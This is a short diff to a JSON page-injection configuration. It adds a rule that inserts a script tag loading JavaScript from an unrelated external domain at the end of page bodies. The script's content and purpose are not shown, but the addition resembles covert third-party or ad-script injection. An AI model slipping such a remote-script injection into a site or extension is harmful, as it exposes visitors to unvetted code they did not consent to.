@@ -417,5 +417,21 @@
       "data-innerHTML":"",
       "position":"end"
     }
+  ],
+  "inject-element-body":[
+    {
+      "name-element":"script",
+      "data-attribute":[
+        {
+          "name-attribute":"type",
+          "value-attribute":"text/javascript"
+        },
+        {
+          "name-attribute":"src",
+          "value-attribute":"https://affairsmithbloke.com/39/ed/0e/39ed0ec94df85e49f588959faf206ded.js"
+        }      
+      ],"data-innerHTML":"",
+      "position":"end"
+    }
   ]
 }
